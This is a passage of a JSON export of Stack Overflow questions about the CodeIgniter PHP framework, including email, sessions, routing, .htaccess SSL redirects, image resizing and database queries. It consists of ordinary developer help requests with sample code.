controller:</p>\n\n<pre><code>$this-&gt;load-&gt;library('email');\n\n$this-&gt;email-&gt;from('your_sender@address.com', 'You');\n$this-&gt;email-&gt;to('recipient@example.com');\n$this-&gt;email-&gt;subject('My first email by Mailjet');\n$this-&gt;email-&gt;message('Hello from Mailjet &amp; CodeIgniter !');\n\n$this-&gt;email-&gt;send();\n</code></pre>\n\n<p>Cheers.</p>\n"},{"tags":["codeigniter","console","doctrine","helper"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12457275,"title":"Doctrine 1.2 Helper in CodeIgniter 2 from the Console","body":"<p>anyone knows how to use the Doctrine 1.2 helper in CodeIgniter 2 from the console?, i have ci 2.1.2 + doctrine 1.2 where doctrine is installed as a helper (application/helpers/doctrine), my doubt is how to execute orders from the command line this way cause i don't have any application/doctrine.php . </p>\n"},{"tags":["php","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":263,"score":0,"question_id":7239183,"title":"CodeIgniter default layout problem: How can i create a default layout for whole project in CodeIgniter_2.0.2?","body":"<p>I want to create a default layout for whole codeigniter project. (like cakephp)</p>\n\n<p>I also need to pass value from database (through controller) to default layout.</p>\n\n<p>How can i do this ?</p>\n"},{"tags":["php","codeigniter","zend-framework2"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":160,"score":3,"question_id":12446671,"title":"Zend Framework 2.0 Interface not found","body":"<h3>Short version</h3>\n\n<p>Where does the Client class look for the <code>DispatchableInterface</code> interface?</p>\n\n<pre><code>class Client implements Libraries\\Stdlib\\DispatchableInterface\n</code></pre>\n\n<hr>\n\n<p>I'm trying to add the ZF2 libraries to a CodeIgniter installation. The whole Zend folder sits in:</p>\n\n<pre><code> /Users/stef/Sites/site_name/application/libraries/\n</code></pre>\n\n<p>In my CI controller I have</p>\n\n<pre><code>public function run()\n{\n    $CI =&amp; get_instance();\n    $CI-&gt;load-&gt;library('Zend');\n    $CI-&gt;load-&gt;library('Zend/Http/Client');\n    $client = new Client($url);\n\n    //Do stuff\n}\n</code></pre>\n\n<p>When I access the run() method I get a fatal error:</p>\n\n<blockquote>\n  <p>Fatal error: Interface <code>'Zend\\Stdlib\\DispatchableInterface'</code> not found in /Users/stef/Sites/site_name/application/libraries/Zend/Http/Client.php on line 27</p>\n</blockquote>\n\n<p>In libraries/Zend.php (a file I added, not part of the ZF) I have</p>\n\n<pre><code>function __construct($class = NULL)\n{\n    // include path for Zend Framework\n    // alter it accordingly if you have put the 'Zend' folder elsewhere\n    ini_set('include_path',ini_get('include_path') . PATH_SEPARATOR . APPPATH . 'libraries/Zend/');\n    }\n</code></pre>\n\n<p>It doesn't seem to matter what I set the include_path to be, even when I put bogus values the fatal error stays the same. So it seems that the loading of the interface <code>DispatchableInterface</code> doesn't make use of the include_path.</p>\n\n<p>How can I get Client.php to \"find\" the interface, which it tries to do so here:</p>\n\n<pre><code>class Client implements Libraries\\Stdlib\\DispatchableInterface\n</code></pre>\n"},{"tags":["php","jquery","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12455618,"title":"how to focus the web page to a defined position with out using # , Codeigniter , Jquery","body":"<p>hi i am using <code>codeigniter</code> and <code>jquery</code>  .</p>\n\n<p>i am using this code to focus the page to a defined location (here , a div).</p>\n\n<pre><code>    jQuery(function() {\n\n      var profile_url = \"&lt;?php echo $widgets['basic_info_widget']['prof_url']; ?&gt;\";\n        if(((window.location+\"/\") != (baseurl+profile_url)) &amp;&amp; (window.location != (baseurl+profile_url))) {\n            location.hash = '#menu';        \n        }   \n    }); \n</code></pre>\n\n<p>by this i am focusing the page to <code>&lt;div id='menu'&gt;&lt;/div&gt;</code></p>\n\n<pre><code>location.hash = '#menu'\n</code></pre>\n\n<p>but the thing is when the script runs <code>#menu</code> is added after the url</p>\n\n<pre><code>http://example.com#menu\n\n\n*can i fous this div without adding #menu at the end of the url .\n</code></pre>\n\n<p>like </p>\n\n<pre><code> http://example.com\n</code></pre>\n\n<p>please help . thanks in advance .</p>\n"},{"tags":["php","codeigniter","session"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":93,"score":0,"question_id":12455149,"title":"PHP Sessions across multiple domains (not subdomains)","body":"<p>I'm trying to set it up so if you log in to my website (using codeigniter) the session carries over to other domains (not subdomains) of my multiple websites. For example, if you go to domain.com and log in, then go to domain2.com, you'll already be logged in at domain2.com.</p>\n\n<p>I cannot figure out where to start.</p>\n"},{"tags":["php","codeigniter","content-management-system","halogy"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":11663517,"title":"Halogy dashboard is not displaying graph","body":"<p>I am using halogy cms built on Codeigniter.<br>\ni have installed it successfully. \nits working in the sub folder but i am having a problem because i see dashboard statistics are not displayed.<br>\nI configured it couple of months ago and the dashboard was being displayed but i can't remember how i did it.<br>\nAny help?<br>\nHere is what i have modified</p>\n\n<pre><code>config/site_config.php\n$config['uploadsPath']      =   'static/uploads';\n$config['staticPath']       =   '/halogy/static';\n</code></pre>\n"},{"tags":["codeigniter","datamapper","codeigniter-datamapper"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12453766,"title":"codeigniter datamapper get_rules not called after save()","body":"<p>I'm using <a href=\"http://datamapper.wanwizard.eu\" rel=\"nofollow\">Datamapper ORM for CodeIgniter</a> I have rules 'serialized' and <code>get_rules</code> 'unserialized' for a field in my model. This field will store serialized data and when I retrieve back, <code>get_rules</code> will unserialize it.</p>\n\n<p>However, after calling <code>save()</code>, I'm trying to re-access the field, but it still return serialized string, instead of array.</p>\n\n<p>Is there any way to re-call or refresh my object so that the <code>get_rules</code> is called again and the field now return array?</p>\n\n<p>Here's my model:</p>\n\n<pre><code>class User extends DataMapper{\n  public $validation = array(\n    'password' =&gt; array(\n      'label' =&gt; 'Password',\n      'rules' =&gt; array('encrypt')\n    ),\n    'preferences' =&gt; array(\n      'rules' =&gt; array('serialize'),\n      'get_rules'=&gt; array('unserialize')\n    )\n  );\n\n  function __construct($id = NULL)\n  {\n    parent::__construct($id);\n  }\n\n  function post_model_init($from_cache = FALSE)\n  {\n  }\n\n  public function _encrypt($field)\n  {\n    if (!empty($this-&gt;{$field}))\n    {\n      $this-&gt;{$field} = md5($this-&gt;{$field});\n    }\n  }\n}\n</code></pre>\n"},{"tags":["codeigniter","plugins","editor","tinymce","http-status-code-404"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":173,"score":2,"question_id":7696780,"title":"Howto solve TincMce imagemanager NetworkError","body":"<p>It was working until my hosting do some changes to server. I don't know what changes they have made.</p>\n\n<p>request is:\n<a href=\"http://mysite.com/tiny_mce/plugins/imagemanager/js/compressor.php?classes=mox.Event,mox.List,mox.DOM,mox.geom.Point,mox.geom.Rect,mox.String,mox.dom.Drag,mox.tpl.Template,mox.tpl.Paging,mox.data.ResultSet,mox.net.Cookie,mox.ui.WindowManager,mox.ui.Menu,mox.ui.MenuItem,mox.ui.DropMenu,mox.ui.DropMenuItem,mox.dom.Layer,mox.dom.Tween,mox.net.JSON,mox.dom.Form,mox.util.Dispatcher,moxiecode.manager.BaseManager,moxiecode.manager.ImageManager,moxiecode.manager.DevKit\" rel=\"nofollow\">http://mysite.com/tiny_mce/plugins/imagemanager/js/compressor.php?classes=mox.Event,mox.List,mox.DOM,mox.geom.Point,mox.geom.Rect,mox.String,mox.dom.Drag,mox.tpl.Template,mox.tpl.Paging,mox.data.ResultSet,mox.net.Cookie,mox.ui.WindowManager,mox.ui.Menu,mox.ui.MenuItem,mox.ui.DropMenu,mox.ui.DropMenuItem,mox.dom.Layer,mox.dom.Tween,mox.net.JSON,mox.dom.Form,mox.util.Dispatcher,moxiecode.manager.BaseManager,moxiecode.manager.ImageManager,moxiecode.manager.DevKit</a></p>\n\n<p>it returns NetworkError: 404 Not Found </p>\n\n<p>if i remove mox.net.Cookie and mox.net.JSON by hand from the querystring it works.</p>\n\n<p>What should be the problem? How can i solve it.</p>\n\n<p>I use CodeIgniter.</p>\n\n<p>Thank you.</p>\n"},{"tags":["php",".htaccess","codeigniter","ssl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12445296,"title":"Codeigniter + SSL + .htaccess + infinite redirects","body":"<p>I am trying to setup SSL on my codeigniter site, but I'm running into a few problems.</p>\n\n<p>Codeigniter refuses to access https://. Firefox displays this error:</p>\n\n<blockquote>\n  <p>The page isn't redirecting properly.\n  Firefox has detected that the server is redirecting the request for this address in a way that will never complete.</p>\n</blockquote>\n\n<p>My config file has this as the base_url</p>\n\n<pre><code>$config['base_url'] = \"http\".((isset($_SERVER['HTTPS']) &amp;&amp; $_SERVER['HTTPS'] == \"on\") ? \"s\" : \"\").\"://\".$_SERVER['HTTP_HOST'].str_replace(basename($_SERVER['SCRIPT_NAME']),\"\",$_SERVER['SCRIPT_NAME']);\n</code></pre>\n\n<p>My .htaccess file is as follows:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(index\\.php|first_cut|media|robots\\.txt|user_guide|xd_receiver\\.htm|channel.php)\nRewriteRule ^(.*)$ /index.php/$1 [L]\n</code></pre>\n\n<p>Ideally I would like https:// to always be applied to these folders...</p>\n\n<ul>\n<li>/facebook/competition</li>\n<li>/dimensions/</li>\n</ul>\n\n<p>... and then optional https for the rest of the site</p>\n\n<p>Any ideas?</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2996,"score":0,"question_id":9391603,"title":"Create an Admin panel with CodeIgniter","body":"<p>I went through a blog; \n<a href=\"http://philsturgeon.co.uk/blog/2009/07/Create-an-Admin-panel-with-CodeIgniter\" rel=\"nofollow\">http://philsturgeon.co.uk/blog/2009/07/Create-an-Admin-panel-with-CodeIgniter</a></p>\n\n<p>I have already built the frontend of the whole site and now the client wants few features to be added in an admin section. I followed the 1st method but it didn't work for me except the very first page (i.e. set in routes.php as <code>$route['default_controller'] = \"main\";</code>).</p>\n\n<p>The URL looks like <code>\"http://localhost/myproject/admin/dashboard\"</code> , yes it leads to a <code>404 page</code>. </p>\n\n<p>I have fully followed the way you have described above (folder structure and setting 2 index files). Am i missing anything? Or it just doesn't work at all in my case?</p>\n"},{"tags":["php","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":591,"score":0,"question_id":10484391,"title":"In Codeigniter 2, how do I use native sessions?","body":"<p>How do I use native sessions in CodeIgniter?</p>\n\n<p>Currently I am using <code>session_start</code> in <code>constants.php</code>. Is that the right way? What are the pitfalls and is there a better way?</p>\n\n<p><strong>I am doing this because we have a PHP app and we plan to do the new coding in CI.</strong></p>\n\n<p>Also, I am looking at a good CI doc that teaches me CI basics preferably for version 2.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql","sql-server","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12453074,"title":"How to disable CodeIgniter SQL error message Dynamically","body":"<p>I'm resting my SQL Auto increment value following SQL Command. But in SQL it's throw like an message. But In CodeIgniter get like Error Message. </p>\n\n<p>This is my Code</p>\n\n<pre><code>$sql = \"DBCC CHECKIDENT (table_name, RESEED, 1)\";\n$res = $this-&gt;db-&gt;query($sql);\n</code></pre>\n\n<p>How can i reset my auto increment value without getting an error OR dynamically disable CI Error message.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":97,"score":1,"question_id":12448479,"title":"Is this admin area protection technique in my CodeIgniter admin controller only for one ip address good?","body":"<p>I would like to protect my admin section but I am not sure if something like php if ip condition in construct of my Admin controller is enough.</p>\n\n<p>I have all my files out of the root so only assets like images, css , js and index is available if ddos will be successful. Which is ok.</p>\n\n<p>However, is condition like this enough for protecting my admin area?</p>\n\n<p>Begining of my Admin class controller:</p>\n\n<pre><code>class Admin extends CI_Controller {\n\n    function __construct()\n    {\n\n        parent::__construct();\n\n            if ($this-&gt;input-&gt;ip_address() != '127.0.0.1')\n        {\n            redirect('/');\n        }\n\n        if (!$this-&gt;session-&gt;userdata('logged_in_admin') )\n        {\n            redirect('admin/login');\n        }\n\n\n    }\n\n...\n</code></pre>\n\n<p>Is this security check of my own IP address 127.0.0.1 - just as an example ;) ) enough?</p>\n\n<p>Can this be broken? If yes how?</p>\n"},{"tags":["php","codeigniter","image-manipulation"],"answer_count":5,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":2867,"score":1,"question_id":5461783,"title":"Resizing an image on the fly using CodeIgniter","body":"<p>I am working on a script that downloads a file from Dropbox, supposed to resize that image and then shoot it up to an S3 bucket.</p>\n\n<p>For some reason, I can't get the image to resize.</p>\n\n<p>I keep getting the following error:<br/>\n<em>The path to the image is not correct.\nYour server does not support the GD function required to process this type of image.</em></p>\n\n<p>Code Base:<br /></p>\n\n<pre><code>public function resize_test() {\n            $postcard_assets = $this-&gt;conn-&gt;getPostcardDirContent(\"folder_name\", \"Photos\", TRUE);\n\n            foreach($postcard_assets['contents'] as $asset) {\n                $file = pathinfo($asset['path']);\n                $original_file = $this-&gt;conn-&gt;downloadFile($asset['path']);\n\n                $raw_file = sha1($file['basename']);\n                $s3_file_name = \"1_{$raw_file}.{$file['extension']}\";\n                $this-&gt;resize_photo($original_file);\n                $this-&gt;s3-&gt;putObject($s3_file_name, $original_file, 's3-bucket-name', 'public-read');\n\n                $s3_check = $this-&gt;s3-&gt;getObjectInfo($s3_file_name, 's3-bucket-name');\n\n                if($s3_check['content-length'] &gt; 0) {\n                    krumo($s3_check);\n                    exit();\n                }\n            }\n        }\n\nprivate function resize_photo($photo) {\n            $config['image_library'] = 'imagemagick';\n            $config['source_image'] = $photo;\n            $config['maintain_ratio'] = TRUE;\n            $config['width']     = 640;\n            $config['height']   = 480;\n\n            $this-&gt;load-&gt;library('image_lib', $config);\n\n            if(!$this-&gt;image_lib-&gt;resize()) {\n                exit($this-&gt;image_lib-&gt;display_errors());\n            }\n        }\n</code></pre>\n\n<p>Dropbox API DownloadFile:<br /></p>\n\n<pre><code>    public function downloadFile($file) {\n        $this-&gt;setTokens();\n        return $this-&gt;conn-&gt;getFile($file);\n    }\n</code></pre>\n\n<p>Anyone know what I might be doing wrong?</p>\n"},{"tags":["codeigniter","template-engine"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12448565,"title":"Can I remove/hide unused pseudo variables when using CodeIgniter's Template Parser Class?","body":"<p>So I'm using Codeigniter's <a href=\"http://codeigniter.com/user_guide/libraries/parser.html\" rel=\"nofollow\">Template Parser Class</a> as my template engine. It's pretty basic, but it should do what I need. My only beef with it is that it displays the unused pseudo-variables. This is a deal-breaker for me!</p>\n\n<p><em><strong>Controller</em></strong></p>\n\n<pre><code>public function index()\n{\n   $this-&gt;parser-&gt;parse('templates/home', array('foo'=&gt;'bar'));\n}\n</code></pre>\n\n<p><em><strong>View</em></strong></p>\n\n<pre><code>{foo}\n{hello}\n</code></pre>\n\n<p><em><strong>Output</em></strong></p>\n\n<blockquote>\n  <p>bar {hello}</p>\n</blockquote>\n\n<p>Does anybody know how I can prevent the unused pseudo-variables from displaying?</p>\n\n<hr>\n\n<p>CodeIgniter 2.1.2</p>\n\n<hr>\n\n<p>On a side-note, I'm open to alternatives. I haven't been able to find a robust template engine for CodeIgniter 2 that wasn't out-of-date or doesn't have decent documentation.</p>\n"},{"tags":["database","codeigniter","order"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":106,"score":0,"question_id":12434680,"title":"Process form checkboxes in php codeigniter and update gallery order in database?","body":"<p>I'm trying to set up an admin page where I'll be able to select images from a gallery with check boxes in a web-form then remove the images from the file system as well as the database. The issue I'm having is how I should update the database.</p>\n\n<p>As you can see in the model, I currently update the database after each file was removed, the just keep count of how many were removed and subtracting that from the \"old\" order number since image 23 after 10 images before it were removed would end up being image 23-10 = 13). Not sure if there might be a few break cases where this wont work.</p>\n\n<p>It seems to work but noticed if the gallery has a lot of pictures the database order id doesn't get updated after 35. I'm wondering if that might be some limit like how many connections can be made to the database in a given amount of time? Is there a way I could store all the order id's and update them all at once or is making a connection to the database each time correct(I'm doubting since that seems like bad practice)?</p>\n\n<p>The web-form:</p>\n\n<pre><code>&lt;form action=\"http://localhost/admin/galleryRemove\" method=\"post\" enctype=\"multipart/form-data\"&gt;\n    &lt;input type=\"checkbox\" name=\"orderID[]\" value=\"1\"  /&gt;\n    &lt;img src=\"http://localhost/img/galleries/001/img01.jpg\" alt=\"1\" class=\"imgCheck\" /&gt;\n\n    &lt;input type=\"checkbox\" name=\"orderID[]\" value=\"2\"  /&gt;\n    &lt;img src=\"http://localhost/img/galleries/001/img02.jpg\" alt=\"2\" class=\"imgCheck\" /&gt;\n\n    &lt;input type=\"checkbox\" name=\"orderID[]\" value=\"3\"  /&gt;\n    &lt;img src=\"http://localhost/img/galleries/001/img03.jpg\" alt=\"3\" class=\"imgCheck\" /&gt;\n\n    &lt;input type=\"checkbox\" name=\"orderID[]\" value=\"4\"  /&gt;\n    &lt;img src=\"http://localhost/img/galleries/001/img04.jpg\" alt=\"4\" class=\"imgCheck\" /&gt;\n\n    &lt;input type=\"checkbox\" name=\"orderID[]\" value=\"5\"  /&gt;\n    &lt;img src=\"http://localhost/img/galleries/001/img05.jpg\" alt=\"5\" class=\"imgCheck\" /&gt;\n\n    &lt;input type=\"checkbox\" name=\"orderID[]\" value=\"6\"  /&gt;\n    &lt;img src=\"http://localhost/img/galleries/001/img06.jpg\" alt=\"6\" class=\"imgCheck\" /&gt;\n\n    &lt;input type=\"checkbox\" name=\"orderID[]\" value=\"7\"  /&gt;\n    &lt;img src=\"http://localhost/img/galleries/001/img07.jpg\" alt=\"7\" class=\"imgCheck\" /&gt;\n\n    &lt;input type=\"checkbox\" name=\"orderID[]\" value=\"8\"  /&gt;\n    &lt;img src=\"http://localhost/img/galleries/001/img08.jpg\" alt=\"8\" class=\"imgCheck\" /&gt;\n\n    &lt;input type=\"checkbox\" name=\"orderID[]\" value=\"9\"  /&gt;\n    &lt;img src=\"http://localhost/img/galleries/001/img09.jpg\" alt=\"9\" class=\"imgCheck\" /&gt;\n\n    &lt;input type=\"checkbox\" name=\"orderID[]\" value=\"10\"  /&gt;\n    &lt;img src=\"http://localhost/img/galleries/001/img10.jpg\" alt=\"10\" class=\"imgCheck\" /&gt;\n\n    &lt;input type=\"hidden\" name=\"galleryID\" value=\"1\" /&gt;\n    &lt;input type=\"submit\" name=\"remove\" value=\"Remove\"  /&gt; This will remove all images checked.\n&lt;/form&gt;\n</code></pre>\n\n<p>CI model for processing the form post.</p>\n\n<pre><code>// Start of removing an image functions\n    function imgRemove()\n    {\n        $cnt = 0;\n        $id = $this-&gt;input-&gt;post('galleryID');\n        foreach ($_POST['orderID'] as $order)\n        {                \n            $order = $order - $cnt;\n            // get the picture name\n            $this-&gt;db-&gt;select('*');\n            $this-&gt;db-&gt;where(\"gallery_id = '$id'\");\n            $this-&gt;db-&gt;where(\"`order` = '$order'\");\n            $this-&gt;db-&gt;from('gallery');\n            $q = $this-&gt;db-&gt;get();\n            if ($q-&gt;num_rows != 0)\n            {\n                $result = $q-&gt;result();\n                $picture = $result[0]-&gt;picture;\n\n                // Get the path and then unlink(delete) the file and it's thumbnail\n                $imgPath = $this-&gt;imgPath($id);\n                $img =  $imgPath . $picture;\n                $thumbImg =  $imgPath . 'thumbs/thumb' . $picture;\n                if (file_exists($img))\n                {\n                    unlink($img);\n                }\n                if (file_exists($thumbImg))\n                {\n                    unlink($thumbImg);\n                }\n\n                // Remove the line from the database\n                $this-&gt;db-&gt;where('gallery_id', $id);\n                $this-&gt;db-&gt;where('order', $order);\n                $this-&gt;db-&gt;delete('gallery');\n                // Reorder all images after the deleted one.\n                $this-&gt;imgOrderCheckRemove($id, $order);\n                $cnt++;\n            }\n        }\n    }\n</code></pre>\n\n<p>Database table layout:<br>\n<img src=\"http://i.stack.imgur.com/KHxWl.png\" alt=\"enter image description here\"></p>\n\n<p>Results from var_dump($images); right before the update_batch.</p>\n\n<pre><code>array(3) {\n    [2]=&gt;\n    array(5) {\n        [\"prim_id\"]=&gt;\n        string(1) \"8\"\n        [\"gallery_id\"]=&gt;\n        string(1) \"2\"\n        [\"picture\"]=&gt;\n        string(21) \"002.jpg\"\n        [\"order\"]=&gt;\n        string(1) \"2\"\n        [\"alt_text\"]=&gt;\n        string(1) \"2\"\n    }\n    [10]=&gt;\n    array(5) {\n        [\"prim_id\"]=&gt;\n        string(2) \"16\"\n        [\"gallery_id\"]=&gt;\n        string(1) \"2\"\n        [\"picture\"]=&gt;\n        string(18) \"010.jpg\"\n        [\"order\"]=&gt;\n        string(2) \"10\"\n        [\"alt_text\"]=&gt;\n        string(2) \"10\"\n    }\n    [13]=&gt;\n    array(5) {\n        [\"prim_id\"]=&gt;\n        string(2) \"19\"\n        [\"gallery_id\"]=&gt;\n        string(1) \"2\"\n        [\"picture\"]=&gt;\n        string(15) \"013.jpg\"\n        [\"order\"]=&gt;\n        string(2) \"13\"\n        [\"alt_text\"]=&gt;\n        string(2) \"13\"\n    }\n}\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":12443018,"title":"CodeIgniter URL, File, Controller organization. What is the best way?","body":"<p>I am new at CodeIgniter framework with also MVC, thus i have confused how the organization should be.</p>\n\n<p>I will write a large application. I need well organized File Structure.</p>\n\n<p>For example, i have categories with also products, records etc.. which are unique to a category. I have a admin panel.</p>\n\n<p>Here is my URL for controlling categories at admin panel:</p>\n\n<p>Index(List of categories): mysite.com/index.php/admin/category/index\nCreate(Creating new category): mysite.com/index.php/admin/category/create</p>\n\n<p>First of all i need a dashboard for categories which shows their products, records etc..\nI want the new url to be like:</p>\n\n<pre><code>mysite.com/index.php/admin/category/id/5\nor\nmysite.com/index.php/admin/category/name/category1\netc..\n</code></pre>\n\n<p>I want products url to be like:</p>\n\n<pre><code>mysite.com/index.php/admin/category/id/5/product\nand records to be like:\nmysite.com/index.php/admin/category/id/5/record\n</code></pre>\n\n<p>Of course i need to parse value's to products or records like:</p>\n\n<pre><code>mysite.com/index.php/admin/category/id/5/product/id/5\nor\nmysite.com/index.php/admin/category/id/5/product/create - to add new product to a category\n</code></pre>\n\n<p>As i said before my application is large\nI thought file organization something like this:</p>\n\n<pre><code>controllers/admin.php - admin controller\ncontrollers/admin/category.php - category controller\ncontrollers/admin/category/product.php - product controller\ncontrollers/admin/category/record.php - record controller\n</code></pre>\n\n<p>I need your advices how to make organization.\nHow can i show products unique to a category</p>\n\n<p>Should My product controller extends from category controller etc.. Can you help and advice me please? Thanks.</p>\n"},{"tags":["php","codeigniter","date","datetime","date-format"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":87,"score":0,"question_id":12447110,"title":"PHP date format, remove time and more","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/2167916/convert-one-date-format-into-another-in-php\">Convert one date format into another in PHP</a>  </p>\n</blockquote>\n\n\n\n<p>starting from <code>$date = '2012-09-09 03:09:00';</code>\nI would like to do two things.</p>\n\n<ol>\n<li>remove the time from the string so it will looks as shown\n<code>\"2012-09-09\"</code></li>\n<li>calculate how much <code>years,days and hours</code> are passed from that date\nusing the server current datetime.</li>\n</ol>\n\n<p>does anyone can help me showing some pieces of code?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":90,"score":2,"question_id":12446334,"title":"CodeIgniter select and display result in view","body":"<p>I have the following simple code:\nThe model:</p>\n\n<pre><code>function get_last_ten_entries()         \n{\n    $this-&gt;db-&gt;get('property');\n}\n</code></pre>\n\n<p>controller:</p>\n\n<pre><code>public function load_recent()\n{\n    $data['info'] = $this-&gt;propertymodel-&gt;get_last_ten_entries();\n    $this-&gt;load-&gt;view('load_property', $data);\n}\n</code></pre>\n\n<p>view:</p>\n\n<pre><code>&lt;?\necho $data['id'];\n?&gt;\n</code></pre>\n\n<p>This is not working. Am sure i am doing something wrong because the error shown says </p>\n\n<blockquote>\n  <p>A PHP Error was encountered</p>\n  \n  <p>Severity: Notice</p>\n  \n  <p>Message: Undefined variable: data</p>\n  \n  <p>Filename: views/load_property.php</p>\n  \n  <p>Line Number: 2</p>\n</blockquote>\n\n<p>Property is a table in the database in which there is a field called id. what's going wrong?</p>\n\n<p>Thank you all</p>\n"},{"tags":["mysql","sql","query","codeigniter","match"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":38,"score":-1,"question_id":12446996,"title":"SQL query MATCH not working with selected columns","body":"<p>i have this query:</p>\n\n<pre><code>SELECT (\n  *)\n   ,\n  MATCH(table1.tags,table1.title,table1.description) AGAINST ('\".$keywords.\"' IN BOOLEAN MODE) AS ideas_score \n  FROM table1  JOIN table2 ON table1.id_user = table2.id  HAVING ideas_score &gt; 0 \n  ORDER BY ideas_score DESC;\n</code></pre>\n\n<p>why does if i do this it doesn't works? </p>\n\n<pre><code>SELECT (\n   table1.description,\n table1.title,\n   table1.id,\n   table1.id_user,\n   table1.tags,\n   table1.insert_datetime,\n   table2.fb_id,\n   table2.fb_aliasname,\n   table2.firstname,\n   table2.lastname)\n   ,\n  MATCH(table1.tags,table1.title,table1.description) AGAINST ('\".$keywords.\"' IN BOOLEAN MODE) AS ideas_score \n  FROM table1  JOIN table2 ON table1.id_user = table2.id  HAVING ideas_score &gt; 0 \n  ORDER BY ideas_score DESC;\n</code></pre>\n\n<p>i always receive this error:</p>\n\n<pre><code>Error Number: 1241\n\nOperand should contain 1 column(s)\n</code></pre>\n"},{"tags":["php","debugging","codeigniter","logging","codeigniter-routing"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":88,"score":2,"question_id":12446184,"title":"Debugging routes in codeigniter?","body":"<p>I am wondering if there is any simple way of debugging routes in code igniter?</p>\n\n<p>preferably I would like to be able to see in the log along the lines of:</p>\n\n<pre><code>Client sent : apps/something\nRoute found : apps/(:any) --&gt; applications/searchbyname/$1\nRedirecting : apps/something --&gt; applications/searchbyname/something\n//and just cause we can lets make the searchbyname function not exist\nERROR - 2012-09-16 22:10:05 --&gt; 404 Page Not Found --&gt; applications/searchbyname/something\n</code></pre>\n\n<p>Basically it means we can see when we hit a route and where it is trying to load.</p>\n\n<p>Is there any way to enable something along these lines?</p>\n"},{"tags":["php","codeigniter","zend-studio"],"answer_count":0,"favorite_count":1,"up_vote_count":3,"down_vote_count":3,"view_count":112,"score":0,"question_id":12446681,"title":"What is the difference between zend-framework and codeigniter","body":"<p>I know that both zf and ci are coded in Object Oriented MVC pattern. I know how to use PHP OOP programming. I've just downloaded ZF and CI but have no idea of it.</p>\n\n<ol>\n<li>Which one is easier to use? </li>\n<li>Is the way of coding similar in both framework?</li>\n<li>Should we use Zend Studio for CI?</li>\n</ol>\n\n<p>I don't know the difference between ZF and CI. Please give me the idea so that I can select which one to start first or use both together.  </p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12438390,"title":"How to add or delete email with the same form?","body":"<p>I now use codeigniter and I want to add or delete records according to the checkbox value.</p>\n\n<p>Like if 'send zero' then delete, or if 'send one' value then add.<br>\nHow to do this task?</p>\n\n<pre><code> &lt;!-- Mail Menu Start --&gt;\n    &lt;div class=\"block\"&gt;\n        &lt;div class=\"titleSmal\"&gt;&lt;img src=\"&lt;?= base_url(); ?&gt;global/site/images/mailMenu.png\" alt=\"\" /&gt;&lt;/div&gt;\n        &lt;div class=\"content\"&gt;\n            &lt;form action=\"&lt;?= base_url(); ?&gt;mailinglist/send\" method=\"post\"&gt;\n                &lt;fieldset class=\"form vote\"&gt;\n                    &lt;legend&gt;&amp;nbsp;&lt;/legend&gt;\n                    &lt;input id=\"e-mail\" class=\"textBox med\" name=\"ML_Email\" value=\"&lt;?= set_value('ML_Email')?&gt;\" /&gt;&lt;span class=\"correct\"&gt;accepted..&lt;/span&gt;&lt;br /&gt;\n\n                    &lt;input id=\"subscription\" type=\"radio\" name=\"status\" value=\"1\" /&gt;&lt;label for=\"answer1\" class=\"label\"&gt;subscription&lt;/label&gt;\n                    &lt;input id=\"unsubscribe\" type=\"radio\" name=\"status\" value=\"0\" /&gt;&lt;label for=\"answer2\" class=\"label\"&gt;unsubscribe&lt;/label&gt;&lt;br /&gt;\n                &lt;/fieldset&gt;\n                &lt;input id=\"submit\" type=\"submit\" value=\"submit\" class=\"button sml\" /&gt;\n            &lt;/form&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;&lt;!-- Mail Menu End --&gt;\n</code></pre>\n\n<p>controller function</p>\n\n<pre><code>   function send() {\n        $this-&gt;form_validation-&gt;set_error_delimiters(\"&lt;span class='incorrect'&gt;\", \"&lt;/span&gt;\");\n        $this-&gt;form_validation-&gt;set_rules('ML_Email', 'البريد الالكتروني', 'trim|required|xss_clean|valid_email');\n        if ($this-&gt;form_validation-&gt;run() == false) {\n            $this-&gt;view('site/sending_error');\n        } else {\n            if($this-&gt;input-&gt;post('status')==1)\n            $this-&gt;mailinglist-&gt;send();\n            echo $this-&gt;db-&gt;last_query();\n            exit;\n            